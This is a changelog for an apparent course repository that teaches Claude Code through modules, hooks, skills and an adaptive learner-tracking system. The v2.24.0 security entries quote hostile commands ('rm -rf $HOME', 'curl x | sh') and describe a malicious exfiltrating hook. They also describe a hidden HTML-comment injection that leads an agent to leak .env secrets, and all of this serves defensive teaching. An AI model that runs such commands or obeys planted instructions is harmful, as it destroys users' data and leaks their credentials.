# Changelog

## v2.28.0 (2026-04-24)

**Curriculum sync to CC v2.1.119.** Five changelog versions (v2.1.115–v2.1.119); v2.1.115 and v2.1.118 overlapped ~100% (same-day re-release), deduped to one feature list.

- **Context files (11 updated):** `changelog-cc.txt`, `interactive-mode.txt`, `models.txt`, `sl-guide.txt`, `hooks.txt`, `mcp.txt`, `subagents.txt`, `tasks.txt`, `plugins.txt`, `claudemd.txt`, `common-workflows.txt`. Highlights: `type: "mcp_tool"` new hook type, `/usage` replaces `/cost`+`/stats`, `/model` persistence + `ANTHROPIC_DEFAULT_*_MODEL_NAME` overrides, `/config` persists to `~/.claude/settings.json`, agent frontmatter `hooks:`/`mcpServers:` now fire in main-thread mode, `CLAUDE_CODE_FORK_SUBAGENT`/`CLAUDE_CODE_HIDE_CWD`/`DISABLE_UPDATES` env vars, `--from-pr` accepts GitLab/Bitbucket/GHE URLs, `cleanupPeriodDays` sweeps tasks + shell-snapshots, plugin ecosystem updates (themes via plugins, `claude plugin tag`, dep auto-install, `prUrlTemplate`).
- **Module steps (7 bundled steps × 5 projects = 35 module-file edits):** Modules 1, 2, 5, 7, 8, 9, 10 each gained one consolidated step covering multiple related updates from the sync window. Bundled-step approach (vs spreading into ~15 one-feature steps) avoided pushing Module 1 past 17 steps; step-count ratio is 15/9 = 1.67× across modules, under the 2× bloat threshold.
- **Verification:** 638 tests pass; `render-module-headers.js` reports `{"unchanged": 50}`; sample renders across all 5 projects on Modules 1 and 5 exit clean with no marker leakage.

See `.claude/sync-report.md` for the full list of per-context-file changes and per-project step numbers.

## v2.27.2 (2026-04-24)

**Hook portability — deeper fix: scripts + docs now all use `$CLAUDE_PROJECT_DIR`.** Follow-up to v2.27.1 after auditing every surface where the repo tells CC to invoke a script. The shallow `settings.json` fix shipped in v2.27.1 wasn't sufficient — even with the correct spawn command, the scripts themselves resolved their I/O through `process.cwd()`, so if a user launched CC from a subdirectory the hook would spawn but then read/write `learner-profile.json` in the wrong place.

- `.claude/scripts/observe-interaction.js`, `learner-context.js`, `learner-streak-check.js`, `module-boundary.js`: now resolve `learner-profile.json`, `.observe-lock`, and `CLAUDE.local.md` via `process.env.CLAUDE_PROJECT_DIR || process.cwd()` instead of plain `process.cwd()`. Matches the pattern `render-module.js` already uses. `render-module-headers.js` was already correct (`__dirname`-based); `welcome.js` and `check-updates.js` do no file I/O.
- `CLAUDE.md`: two `node .claude/scripts/…` instructions (Module Boundary Assessment, "next module" rule) now use `node "$CLAUDE_PROJECT_DIR/.claude/scripts/…"`. Claude's Bash tool expands the variable identically, but we now model the pattern we want users to copy.
- `.claude/skills/sync/SKILL.md` and `.claude/skills/release/SKILL.md`: script invocations quoted against `$CLAUDE_PROJECT_DIR`.
- `tests/test_adaptive_system.py`: four new cwd-independence tests. Each seeds a profile in a tmp `project/` dir, launches the script from a sibling `elsewhere/` dir (so `process.cwd()` would point to the wrong place), sets `CLAUDE_PROJECT_DIR=project/`, and asserts both that the script reads/writes the project dir AND that nothing leaks into the launcher cwd. Suite: 638 tests (was 634).
- Also restored an `assert "STRUGGLE STREAK" in context_result.stdout` in the end-to-end integration test that had been dropped in an earlier edit.

## v2.27.1 (2026-04-24)

**Hook command portability fix (Windows + paths with spaces).** Reported by Dimitri Zarkadoulas, who hit this on his Windows laptop.

- `.claude/settings.json`: all 5 hook commands (welcome, check-updates, learner-context, learner-streak-check, observe-interaction) now use `node "$CLAUDE_PROJECT_DIR/.claude/scripts/X.js"` instead of `node .claude/scripts/X.js`. The bare relative-path form only worked when CC's cwd was the project root — launching from a subdirectory or through some terminal integrations could silently fail the hook. The new form is cwd-independent and handles paths with spaces (e.g., `Dropbox\Personal\Data Science Projects\...`). This aligns with the CC docs' own "Use absolute paths" best practice (`context/hooks.txt` line 998).
- `projects/sentinel/modules/05-hooks.md`: the two concrete hook examples in Module 5 (§5.2, §5.3) now show the quoted `"$CLAUDE_PROJECT_DIR"/.claude/scripts/X.sh` form so students copy the correct pattern.
- `tests/test_hooks.py`: `test_hook_scripts_referenced_exist` updated to strip surrounding quotes and resolve `$CLAUDE_PROJECT_DIR` before the file-exists check. New `test_hook_commands_use_claude_project_dir` locks the pattern in — any future regression to bare relative paths fails the suite. Total: 634 tests.

## v2.27.0 (2026-04-19)

**PR-PERSONA: level-gated module content.** Shipped across two PRs — infrastructure (#12) and content (#13). Advanced learners now see a tighter, action-focused version of every module; beginner and intermediate learners see the same full scaffolding they saw before. 633 tests pass.

### Phase 1 — Infrastructure (PR #12)

- New `.claude/scripts/render-module.js` preprocessor. Reads Effective Level from `CLAUDE.local.md` (falls back to Experience Level, then intermediate). Strips `<!-- guide-only -->` blocks for advanced learners; strips `<!-- advanced-only -->` blocks for everyone else. Normalizes triple blank lines (CRLF + LF aware). Exits 2 on unbalanced markers — maintainer bug, never ships bad content to a learner.
- `CLAUDE.md`: "next module" instruction now routes through the preprocessor instead of `Read`-ing raw module files. New "Level markers in module files" section documents the marker syntax and rules.
- `tests/test_module_renderer.py`: 12 subprocess integration tests covering all three levels × marker combinations, missing `CLAUDE.local.md`, fallback to Experience Level, unknown level values, unbalanced markers, missing file, multi-block stripping, pass-through, blank-line normalization, marker-leak prevention.

### Phase 2 — Content (PR #13)

- Wrapped 130 `**Why this step:**` paragraphs in `<!-- guide-only -->` markers across 45 module files (all 5 projects, Modules 2-10). Module 1 files untouched (no "Why this step" blocks — already concise).
- Baseline content untouched; markers only *added*, never wrapping over existing prose.
- Renderer fix: original tag-strip regex greedily consumed the blank line after a marker, gluing wrapped paragraphs to the next one. Now consumes only horizontal whitespace and at most one newline, preserving paragraph separation.
- Renderer fix: marker tag text now stripped from output at every level (previously leaked literal `<!-- guide-only -->` in beginner/intermediate renders).

### Design decision

Three options considered for how the "collapse" happens:

1. Plain `<details>` tags — doesn't work in the terminal where most learners read
2. **HTML-comment markers + preprocessor script** ← chosen
3. Two copies per file — 2× maintenance surface, high conflict risk

Option 2 chosen because it works in the terminal, reuses existing Effective Level infrastructure, and keeps one source file per module.

### Verification

- `pytest tests/` → 633 passed (up from 621 at v2.26.0)
- `node .claude/scripts/render-module-headers.js` → `{"unchanged": 50}`
- Canvas Module 5 §5.1 spot-checked at beginner and advanced levels
- All 130 marker pairs balanced (renderer would exit 2 otherwise)

### Intentional out-of-scope (deferred)

- `**Engineering value:**` tiered bullet blocks (also beginner/intermediate scaffolding but need more careful wrap logic)
- Module 5 "First, a plain-English definition:" blockquote (different format; also needs blockquote-formatting fix)
- Module 1 scaffolding (no "Why this step" blocks exist there today)

## v2.26.0 (2026-04-19)

**Curriculum sync to Claude Code v2.1.114.** Phase 1/2 `/sync` skill run across the four-patch delta. Nine context files refreshed; five new module steps added across all five projects (25 module-file edits). No existing steps renumbered or modified. 621 tests pass.

### Context refresh (v2.1.111 – v2.1.114)
- `context/changelog-cc.txt` — prepended v2.1.111 / v2.1.112 / v2.1.113 / v2.1.114 entries
- `context/models.txt` — `xhigh` effort level for Opus 4.7, `max` row, `/effort` interactive slider, Auto-mode behavior change (auto-selects effort based on task)
- `context/interactive-mode.txt` — readline shortcuts (`Ctrl+U` clear buffer + `Ctrl+Y` restore, `Ctrl+A`/`Ctrl+E` start/end of line), Windows `Ctrl+Backspace` word-delete, "Auto (match terminal)" theme option, `CLAUDE_CODE_USE_POWERSHELL_TOOL` env var
- `context/hooks.txt` — read-only bash pass-through (curated safe commands skip permission prompts), `sandbox.network.deniedDomains` precedence, Bash security-rule tightening (`find:-exec`, `/private/` as dangerous-rm target, exec-wrapper deny-matching), `dangerouslyDisableSandbox` honored in plan mode
- `context/security.txt` — `/less-permission-prompts` bundled skill cross-ref, sandbox deny/allow precedence, Bash rule refinements
- `context/skillsmd.txt` — `/less-permission-prompts` bundled skill entry
- `context/subagents.txt` — 10-minute mid-stream subagent stall timeout surfaces clear error instead of silent hang
- `context/tasks.txt` — `/loop` Esc cancellation and "Claude resuming /loop wakeup" banner
- `context/common-workflows.txt` — `/ultrareview` cloud multi-agent review, Auto-mode expansion

### Module steps added (applied to canvas, forge, nexus, sentinel, byop)
- **Module 1 "Recent UX refinements"** (canvas 1.11 / forge 1.10 / nexus 1.9 / sentinel 1.9 / byop 1.11) — Guide persona overview of `xhigh`, auto mode, readline shortcuts, theme auto-match, PowerShell tool, `/ultrareview` preview. Module 1 checkpoint gains "try new readline shortcut" checkbox.
- **Module 7 §7.10 "Permission-model refinements"** — Peer persona; deniedDomains precedence, read-only bash pass-through, Bash rule tightening, `dangerouslyDisableSandbox` + plan mode fix.
- **Module 8 §8.11 "Subagent stall timeout"** — Peer persona; behavioral-change note, no action required.
- **Module 9 "/loop cancellation and wakeup banner"** (canvas/forge/nexus/byop 9.7, sentinel 9.9) — Peer persona; Esc cancel + disambiguating wakeup banner.
- **Module 10 §10.14 "/ultrareview cloud multi-agent review"** — Launcher persona; when-to-reach-for-it vs. when-to-skip framing.

### Verification
- `node .claude/scripts/render-module-headers.js` → `{"unchanged": 50}` (no module-count drift)
- `pytest tests/` → 621 passed
- Two-commit PR structure: context changes, then module steps (PR #11, squash-merged)

## v2.25.0 (2026-04-19)

**Consolidated-signals fixes — Windows polish, MCP package fix, classifier honesty, security index.** Three merged PRs (plus one polish) closing the still-open items from an 8-run agent evaluation synthesis (4 personas × text critique + hands-on walkthrough). Research paper also updated. 621 tests, 0 skipped.

### Real bugs closed
- **MCP package names were 404 across all 5 projects.** `@anthropic-ai/mcp-*` doesn't exist on npm. Replaced with real packages: `@modelcontextprotocol/server-filesystem` (Anthropic-published) for filesystem, `mcp-sqlite` and `mcp-fetch-server` (community-maintained) for SQLite and fetch. 28 replacements across 5 Module 6 files. Plus a new "Verify the package exists before installing" paragraph teaching `npm view` as the durable pattern — hardcoding replacement names would defer the same bug.
- **Module 7 didn't require testing both guard paths.** A PreToolUse guard that silently allows everything looks identical to a working guard at the exit-code level. Added a new section before the Checkpoint showing an explicit allow/deny test matrix with a "both outputs must differ" callout. 5 projects.

### Windows polish
- New "Windows setup — one-time fixes for Git Bash / MSYS" section in Module 1 covering `git init` default branch, `core.autocrlf`, `cmd /c npx` wrapper, and `cygpath -w` for hook scripts. Skip-if-not-Windows framing.
- Module 5 hook scripts now show a Python one-liner fallback alongside `jq` — cross-platform, no extra install. Plus a Windows note about `cygpath -w $CLAUDE_PROJECT_DIR` when piping into native Python.
- Module 10 `git worktree add` commands now use `-b` flag so the branch is created alongside the worktree — fixes a hard error when the branch doesn't pre-exist.
- Nexus Module 2 forwarder step now acknowledges Host-header stripping and upstream timeouts as out-of-scope-but-worth-knowing (gateway-101 hygiene).

### Learner UX
- `/stuck` now surfaces at three friction points — Module 1 Windows setup, Module 5 first Stop-hook debugging step, Module 7 PreToolUse verification — not just at module entries. Addresses the "0 invocations across 5 agent runs" finding.
- Module 4.1 skills-location guidance rewritten to explain `$CLAUDE_PROJECT_DIR` determines which `.claude/` wins, not prescribe a location.
- Forge Module 6 SQLite step reframed as illustration, not storage migration — "your JSON layer is production-fine" framing.
- Module 2 §2.4a "Spotting hallucinations" sub-step with a three-check loop (imports exist? API current? matches observed behavior?) applied at the first moment Claude has written code.

### Security surfacing
- New `context/security.txt` — threat-to-section lookup index across 13 threat categories.
- New `.claude/skills/security-review/SKILL.md` — automated audit skill that inspects `.claude/settings.json` / `skills/` / `.mcp.json` / `CLAUDE.md` for known footguns and reports CRITICAL/HIGH/MEDIUM/LOW findings with specific file references and concrete remediations.

### Adaptive-system honesty
- **Classifier ack allowlist.** `ship it`, `lgtm`, `ok`, `next`, `thanks`, `done`, `perfect`, `sgtm`, etc. now classify as `neutral`, not `passive_acceptance`. Senior engineers replying "ship it" to a good plan should not get demoted.
- **Long-message engagement bias.** Messages >200 chars with conceptual markers (`why`/`how`/`what`/`walk me through`) → `concept_question`; with first-person verbs (`i'm trying`/`thinking`/`wondering`) → `independent_exploration`. Catches terse-engineer phrasing that doesn't hit the short keyword patterns.
- **Banner dedup.** `learner-context.js drainBanners()` now resolves struggle + engagement contradictions by keeping the later-created banner; older conflicting type silently acknowledged.
- **`module-boundary.js` self-heals missing Effective Level.** If CLAUDE.local.md has Experience Level but no Effective Level, the script inserts one on first run and proceeds. Reports `effectiveLevelInitialized: true` in the JSON summary.

### Research paper
- Updated with the author's latest findings from the ongoing 8-agent evaluation series.

## v2.24.0 (2026-04-18)

**Senior-eval-driven fixes — real bugs, security content, Module 2 polish.** One merged PR with 12 commits closing every still-open item from Morgan's senior-persona evaluation (8 years professional experience). All 8 verification checks confirmed open before editing; A3 in particular surfaced a genuine documentation bug.

### Real bugs
- `CLAUDE.md` staleness check now detects the default remote branch via `git symbolic-ref refs/remotes/origin/HEAD` instead of hardcoding `origin/master`. Previously silently failed on any repo whose default branch is `main`.
- `CLAUDE.md` Module Boundary Assessment now documents the 1-5 scale `moduleAverageQuality` uses, with per-category scores and a pointer to `observe-interaction.js`. Thresholds (3.8, 2.0) are now evaluable by tuners and reviewers.
- **Memory hierarchy corrected in all 5 projects' Module 3.** Verification against `code.claude.com/docs/en/memory` revealed the curriculum placed `CLAUDE.local.md` at the BOTTOM of the hierarchy, contradicting Anthropic's own docs ("Within each directory, CLAUDE.local.md is appended after CLAUDE.md, so when instructions conflict, your personal notes are the last thing Claude reads at that level"). Corrected to place CLAUDE.local.md above project CLAUDE.md, with a softened "precedence" framing that matches the docs' concatenate-and-last-wins model.
- Replaced `! git add -A` with `! git status` + `! git add <explicit paths>` in Module 2 across all 5 projects. Added a "Heads up" caution block explaining the `.env` / IDE config / build artifact risk. Three additional `git add -A` instances in Module 1 (canvas/forge) and Module 3 (byop) caught in follow-up.
- Added `jq` to Module 1 as "Shell tools you'll need later" with install commands for macOS / Ubuntu / Windows Git Bash. Inline cross-reference at first jq usage in canvas/forge/nexus/byop Module 5 §5.6.

### Security content (Morgan's strongest signal)
- **New `### 5.1b Hook Trust Model` section** in all 5 projects. Explains what hooks can do (read creds, SSH keys, env vars), trust-model parity with `npm install`, the HTTP hook as an exfiltration primitive, a concrete malicious Stop hook JSON example, and a mitigation checklist (PR review, sandbox mode, read-before-approve).
- **Elevated `disableSkillShellExecution` framing** from one sentence to a multi-paragraph threat treatment. Concrete hostile SKILL.md examples (`! rm -rf $HOME`, `! curl x | sh`), reframed as a trust boundary, default-on recommendation for unaudited repos, cross-reference to the Hook Trust Model.
- **HTML-comment injection caveat** added to Module 3.7 across all 5 projects. Explains asymmetric visibility (auto-load strips, Read reveals), concrete `.env` exfiltration attack scenario, PR-review mitigation.
- **`.mcp.json` supply-chain caveat** in Module 6 across all 5 projects. A PR that adds a new MCP server is a supply-chain event; review with the same bar as CI config or GitHub Actions workflows.

### Module 2 polish
- Port 4001 conflict warning in nexus §2.9 (echo server manual testing).
- One-line PR/fast-forward caveat at end of §2.10 across all 5 projects: real teams open a PR here; we're fast-forwarding for solo learning. Forward reference to Module 10.

### Explicitly deferred (per Morgan)
- Failure-modes appendix per module; dependency DAG diagram; asymmetric struggle/engagement thresholds (research task); cost model; Senior+ Engineering value box retrofit; "Skip to Peer" override (partially mitigated by `/experience` skill already shipped).

## v2.23.0 (2026-04-17)

**Adaptive system closure + student-visible progress + /stuck + /experience.** Four merged PRs since v2.22.0, 27 new tests, 609 total passing.

### Junior-persona content fixes (from PR #1)
- Define "skills vs commands" distinction at top of Module 4 across all 5 projects — resolves Jordan's "what's the difference?" confusion
- Introduce MCP transports (stdio / http / sse) in new §6.1b of Module 6 before first use — previously appeared as unexplained `--transport` flags
- Add "Choose Your Battles" section to Modules 4 and 5 (all 5 projects) — addresses over-engineering risk with rule-of-thumb limits (2-3 skills, 2 hooks)
- Replace abstract plan-mode pitch in Module 2 §2.1 with concrete before/after vignette (Dev A vs. Dev B)

### Adaptive system audit + infrastructure
- `docs/ADAPTIVE-SYSTEM-AUDIT.md` — component inventory, 5-scenario flow trace, prioritized gap list, verifiable verdict
- `tests/test_adaptive_system.py` — 27 integration tests covering observation / streak detection / banner emission / module-boundary algorithm (no mocking, all scripts invoked via `node` subprocess)

### Student-visible progress
- `config/curriculum.json` — single source of truth for module count and per-module time estimates
- `.claude/scripts/render-module-headers.js` — idempotent generator, wired into `/sync` Step 5.10
- Progress bar + time estimate at the top of all 50 module files: `**Progress:** Module N of 10 [███░░░░░░░] 30%`
- Module metadata (CC features, Persona tag) collapsed into `<details>` across all 50 files
- Enriched `/start` Step 2b copy with "why we're asking" rationale on each experience-level option
- README "Time to first working feature: ~90 minutes" callout above Quick Start

### New skills and learner-visible adaptive signals
- `/stuck` skill — reads Current Module + Step from CLAUDE.local.md, re-explains at a deeper tier than the learner's Experience Level; single callout in Module 1 + README
- `/experience` skill — lets the learner change Experience Level mid-course without restarting
- `pendingBanners` queue on `learner-profile.json` — observe-interaction.js queues events on streak transitions, learner-context.js drains and emits verbatim learner-facing banners (`SHOW TO LEARNER`), marks acknowledged so each fires once
- Banners older than 24h silently acknowledged, not surfaced

### Module-boundary enforcement (biggest audit gap closed)
- `.claude/scripts/module-boundary.js` — runs the 3.8 / 2.0 threshold algorithm deterministically when the learner says "next module", bumps Effective Level in CLAUDE.local.md, resets per-module counters, bumps `currentModule`, queues a module-boundary banner if the level changed
- CLAUDE.md updated to invoke the script (replacing the seven-step prose algorithm) and reversed to surface level shifts via banner rather than stay silent
- `currentModule` drift gap closed — script now bumps it every boundary

## v2.22.0 (2026-04-15)

- Add mid-session streak detection via UserPromptSubmit hook — streaks now surface immediately instead of waiting for next session start
- Align README with paper: five contributions (adds adaptive learning system), sync pipeline overview mapping in /sync SKILL.md
- Sync curriculum to CC v2.1.110 (from v2.1.100) — fold-in only sync, 10 context files + 25 module files updated
- Key CC changes: `/tui` fullscreen, `/focus` command, `/recap` session summary, PreCompact hook blocking, `/proactive` alias, plugin background monitors, `permissions.deny` precedence fix

## v2.21.0 (2026-04-10)

- Add streak detection to adaptive learning (Hooshyar et al., 2026) — 3+ consecutive struggle/engagement interactions trigger immediate mid-module response
- Add asymmetric response principle — struggle signals weighted more heavily than success signals
- Sync curriculum to CC v2.1.100 (from v2.1.91) — 8 context files updated, Module 1 fold-ins across all 5 variants
- Key CC changes: default effort now high, `/tag` and `/vim` removed, Monitor tool, `/agents` tabbed layout, `refreshInterval` status line setting

## v2.20.0 (2026-04-03)

- Sync curriculum to CC v2.1.91 (from v2.1.80) — 11 versions of changelog, 10 context files updated, 7 new module steps across all 5 projects
- New steps: `paths:` frontmatter for rules (M3) and skills (M4), conditional hooks with `if` field + `CwdChanged`/`FileChanged` events (M5), `PermissionDenied` hook + `defer` decision (M7), PreToolUse `updatedInput` for AskUserQuestion (M7), agent `initialPrompt` frontmatter (M8), plugin `userConfig` with sensitive storage (M10)
- Medium-value fold-ins: `/powerup`, `/btw`, transcript search, `Ctrl+X Ctrl+E`, Edit-without-Read, `TaskCreated` hook — added to existing steps in Modules 1, 2, 5
- Updated README feature coverage matrix with 6 new rows
- Updated CLAUDE.md module descriptions with new features

## v2.19.1 (2026-03-31)

- Add Step 2.6 Module Health Check to `/sync` skill — flags modules that are 2x+ the size of the smallest or receiving 3+ steps in a single sync
- Add "Handling Foundational Features" escalation policy to `/sync` skill — Options A (promote to early module), B (split module), C (create Module 11)
- Add curriculum architecture rationale note to CLAUDE.md explaining the 10-module dependency chain

## v2.19.0 (2026-03-31)

- Add adaptive learning system inspired by Chung et al. (2025) — engagement quality drives learning outcomes
- Layer 1: Stop hook observes interaction quality (concept questions, exploration, answer-seeking) via heuristics, writes to `learner-profile.json`
- Layer 2: SessionStart hook reads learner profile and injects engagement context into Claude's awareness
- Layer 3: CLAUDE.md module-boundary rules adjust Effective Level (persona) based on accumulated signals
- SKILL.md Step 6.4 scaffolds `Effective Level` and `Engagement Trend` in CLAUDE.local.md template

## v2.18.0 (2026-03-21)

- Integrate `claude-code-guide` agent into `/sync` skill as primary feature research method (replaces raw WebFetch/WebSearch)
- Add `claude-code-guide` agent to `/start` Step 1a curriculum sync with user permission ask (framed as Module 8 preview)
- Both skills fall back to WebSearch if agent returns insufficient detail or user declines

## v2.17.2 (2026-03-21)

- Remove PII (proper names) from changelog

## v2.17.1 (2026-03-21)

- Add research paper PDF: "Agentic Education: Using Claude Code to Teach Claude Code"
- Redesign README with paper title as heading, Paper/version badges, and TL;DR section

## v2.17.0 (2026-03-20)

- Address 5 user-reported friction points from beta testing
- Teach `claude -c`, `--resume`, `/resume`, `/rename` in new SKILL.md Step 6.6 (renumber 6.6-6.8 → 6.7-6.9)
- Add skills scoping note to Module 4 Step 4.1 (all 5 variants) — clarifies `.claude/skills/` must be at project root
- Add Stop hook feedback loop warning to Module 5 Step 5.4 (all 5 variants) — stdout on exit 0 causes infinite loops
- Add "No restart needed" note to Module 8 after first agent STOP block (all 5 variants)
- Add IDE callout to SKILL.md Step 6.2 for VS Code/Cursor users

## v2.16.0 (2026-03-20)

- Add two-layer freshness system to `/start` onboarding — Step 0 now checks repo freshness (git fetch + pull if behind) before CC version check
- Update embedded sync engine with 17-row mapping table, expanded SKIP/KEEP/GRAY AREA triage criteria, second-pass verification, and completeness checklist
- SessionStart hook (`check-updates.js`) now checks repo freshness alongside CC version, with independent failure handling
- Returning users get a silent freshness check on session start with an offer to pull if behind
- Rewrite README "Always Current" section to describe both freshness layers
- Fix heading table in SKILL.md — all projects now consistently use `### Checkpoint` and `### X.N Title`

## v2.15.0 (2026-03-20)

- Sync curriculum to CC v2.1.80 (from v2.1.68) — 12 versions of changelog, 18 context files updated, 11 new module steps across all 5 projects
- Key features added: /color, /effort, -n session naming, /branch, /loop, MCP elicitation & channels, 5 new hook events (StopFailure, PostCompact, InstructionsLoaded, Elicitation, ElicitationResult), SendMessage replacing Agent resume, effort frontmatter, plugin ecosystem updates, ExitWorktree, VS Code /remote-control
- Revamp /sync skill with two-phase approval gate (audit → plan → approve → execute)
- Improve /sync triage thoroughness — expanded mapping table (10→17 rows), explicit skip/keep criteria, second-pass verification, completeness checklist
- Fix pre-existing Module 05 step gap (5.5→5.7) in canvas/forge/byop by splitting into Matchers & Timeouts + Shell Scripting
- Normalize Forge checkpoint headings from ## to ### for cross-project consistency
- Update README and CLAUDE.md module descriptions and feature matrix

## v2.14.0 (2026-03-14)

- Add adaptive teaching persona table — persona boundaries now vary by experience level (beginner/intermediate/advanced) instead of being fixed for all students
- Table is the single source of truth; module file persona tags kept as intermediate baseline for testing
- Add `TestAdaptivePersonaTable` with 7 structural invariant tests (coverage, ordering, cross-level comparisons)

## v2.13.2 (2026-03-13)

- Fix stale test assertion — `test_tests_gitignored` was checking that `tests/` was in `.gitignore`, but the test suite became public in v2.13.0; flipped to assert `tests/` is NOT gitignored

## v2.13.1 (2026-03-13)

- Fix outdated heading format docs in sync skill — all projects were normalized to `### X.N` in v2.10.0, but the skill still listed per-project variations

## v2.13.0 (2026-03-13)

- Add test suite to repository (565 tests) — structural validation covering file existence, cross-references, module completeness, persona tags, CC features consistency across all 5 projects, SKILL.md structure, hooks, and smoke tests
- Tests were previously gitignored; now public for contributors and transparency

## v2.12.1 (2026-03-12)

- Fix hardcoded `workspace/<project>` paths in SKILL.md Steps 6.5 and 6.7 — BYOP users whose project is at an external path would get incorrect `cd` instructions
- Add `"byop"` to test suite PROJECTS list so all parametrized tests cover BYOP modules
- Rename `test_four_projects_listed` → `test_five_options_listed` with BYOP assertion
- Update test docstrings from "4 projects" to "5 projects/options"

## v2.12.0 (2026-03-12)

- Add BYOP (Bring Your Own Project) as 5th option — users learn CC features by applying them to their existing codebase instead of building a tutorial project
- New `projects/byop/README.md` explaining BYOP prerequisites and how it differs from tutorial projects
- New 10 module files in `projects/byop/modules/` — derived from Canvas modules, generified for any project type with "your project" framing
- Update `/start` onboarding skill: add BYOP as option 5, new Step 1c for project path detection and language auto-detection, skip conditions for Steps 2-3, simplified Step 4 checks, Step 5 bypasses scaffolding, Step 6 branches for existing CLAUDE.md and external paths
- Update README.md: "The 5 Options" section, BYOP entry, updated feature matrix with BYOP column
- Update CLAUDE.md: reflect 5 options throughout, add BYOP to repository structure and onboarding flow

## v2.11.0 (2026-03-11)

- Add STOP blocks to Module 1 across all 4 projects (Canvas: 9, Forge: 8, Nexus: 7, Sentinel: 7) — enforces one-step-at-a-time pacing that was missing from Module 1 but present in Modules 2-10
- Add comprehensive error recovery troubleshooting section to `/start` skill — covers 9 failure scenarios (interrupted onboarding, existing workspace, git issues, permission errors, tool install failures, browser launch failures, state file corruption, network failures)

## v2.10.0 (2026-03-11)

- Remove 645+ blockquotes from Forge, Nexus, and Sentinel modules — blockquotes render as dim italics in CLI, making content hard to read (Canvas was fixed in v2.9.4)
- Normalize step headings to `### N.M` format across all projects — Forge used `## N.M` (wrong level), Nexus/Sentinel used `### Step N:` (wrong format)
- Standardize persona lines to double dash (`--`) across all 40 module files — was inconsistent mix of em dash and double dash
- Add `models.txt` to README reference docs table
- Add `auto-memory.txt`, `ide-integration.txt`, `models.txt` to test fixture context file list

## v2.9.5 (2026-03-11)

- Add step-level tracking to prevent skipped steps during module delivery — Claude now updates `Current Step` in CLAUDE.local.md after each numbered step
- Add pre-module-advance check: Claude must cross-check current step against the module's Checkpoint before proposing to move on, catching any skipped steps
- Include `Current Step` field in the CLAUDE.local.md template created during onboarding

## v2.9.4 (2026-03-08)

- Convert ~189 blockquotes to readable formatting across all 10 Canvas module files — blockquotes render as dim italics in the CLI terminal, violating the CLAUDE.md formatting rule
- Quoted prompts (`> "..."`) converted to code blocks with lead-in text; bold headings (`> **STOP**`, `> **Why this step:**`, etc.) converted to plain bold paragraphs

## v2.9.3 (2026-03-07)

- Reduce verbose terminal output during curriculum sync by instructing sync task to use `Write` (single "Wrote file" line) instead of `Edit` (multi-line diff) for module and context file updates
- Add student-facing note in sync narration so file updates scrolling by feel expected, not alarming
- Improve `/release` skill to offer version options (patch/minor/major with rationale) instead of asking open-ended questions

## v2.9.2 (2026-03-07)

- Revert bash scripts back to inline `curl` commands so the first permission prompt shows a narrow `curl` scope instead of broad `bash:*`
- Recommend option 2 ("Yes, and don't ask again") for the safe, read-only `curl` command — auto-approving `curl` also silences later `curl` calls during curriculum sync
- Add teaching note about `bash:*` scope in Step 1a narration for when broader bash commands appear
- Delete `.claude/scripts/fetch-latest-cc-version.sh` and `.claude/scripts/fetch-cc-changelog.sh` (no longer needed)
- Update test to match new plain `curl` approach (no grep pipeline)

## v2.9.1 (2026-03-07)

- Extract inline `curl | grep` pipelines in SKILL.md into dedicated scripts (`.claude/scripts/fetch-latest-cc-version.sh`, `.claude/scripts/fetch-cc-changelog.sh`) to eliminate backslash-escaped-whitespace permission warnings during onboarding
- Add tools guidance note to curriculum sync task steering Claude toward Read/Write/WebFetch/Grep over complex bash pipelines

## v2.9.0 (2026-03-07)

- Move curriculum sync from background agent to inline main flow (Step 1a) — sync now runs directly with narrated status updates, replacing the unreliable background agent approach
- Add graceful failure handling and controlled summary delivery inline after sync completes
- Add version mismatch check in Step 1a (moved from Step 6.8)
- Remove all background agent references: `TaskOutput`, `run_in_background`, `block: false`, agent permissions teaching, and Step 6.8 agent status check
- Fix UTF-8 encoding issue in `test_check_updates_parses_github_response` on Windows (cp1252 → explicit UTF-8 decode)

## v2.8.4 (2026-03-07)

- Add `claude.com/blog` as a supplementary curriculum sync source — background agent now fetches the Anthropic blog index and relevant articles alongside the GitHub CHANGELOG for richer feature coverage
- Defer background agent spawn from Step 0 to new Step 1a (after project selection) so the agent knows which project's modules to update
- Agent now only updates the chosen project's module files instead of all 4 variants
- Consolidate step heading styles into a single reference table in the Background Agent Task

## v2.8.3 (2026-03-07)

- Split onboarding welcome (Step 0a) into its own message — now waits for user acknowledgement before delivering the permissions teaching (Step 0.1), preventing a wall of text on first contact

## v2.8.2 (2026-03-07)

- Fix consistency in background agent permissions teaching moment (Step 0, item 4b) — replace "Go ahead and approve each one" with language that reinforces the deliberate evaluation mindset from Step 0.1
- Soften Module 8 reference from specific ("You'll learn more about this") to general ("You'll work with background agents hands-on") to match actual Module 8 content

## v2.8.1 (2026-03-07)

- Fix changelog version parsing in SKILL.md and /sync — reference bare version numbers (e.g., `2.1.68`) instead of `## vX.Y.Z` headings, matching the actual format of `context/changelog-cc.txt`
- Eliminate double sync message risk — make Step 6.8 the sole delivery point for sync results, remove early mention allowance during Steps 4-5
- Add WebSearch fallback chain to /sync skill — falls back to WebFetch of official docs, then CHANGELOG text alone if both fail

## v2.8.0 (2026-03-07)

- Rewrite background curriculum sync to use safe append-before-checkpoint strategy — new module steps are inserted before the Checkpoint section, existing steps are never modified or renumbered
- Add self-verification step (Step 2b) to sync agent — checks step numbering, checkpoint existence, STOP block integrity, and auto-reverts malformed files
- Scope sync commit to verified files only — reverted files are excluded
- Add "After sync completes" section — tells learners about new CC features they'll encounter in upcoming modules
- Create `/sync` skill for manual maintainer-triggered curriculum sync (foreground, no auto-commit, writes `.claude/sync-report.md` with detailed report)
- Add `.claude/sync-report.md` to `.gitignore`

## v2.7.18 (2026-03-06)

- Add exit/resume teaching step to Module 4 across all 4 projects — teaches `/exit` and `claude --resume` between skill creation and testing, since new skills need a session restart to appear in autocomplete
- Canvas/Forge: new step 4.4 with renumbered subsequent steps
- Nexus/Sentinel: new step 3b (consistent with existing numbering)

## v2.7.17 (2026-03-05)

- Add `/statusline` teaching to Module 3 usage step across all 4 projects — persistent status bar for context/cost monitoring
- Update all 4 README feature tables with `/statusline` in Module 3 CC features
- Update Module 10 final checklists to include `/statusline`

## v2.7.16 (2026-03-05)

- Add account-aware usage tracking step to Module 3 (all 4 projects) — teaches `/stats` for subscribers, `/cost` for API key users
- Update STOP blocks in Nexus/Sentinel Module 3 to reference three context management tools
- Add `/cost` to `context/interactive-mode.txt` command reference
- Update Module 10 final checklists and tips to include `/stats` or `/cost`
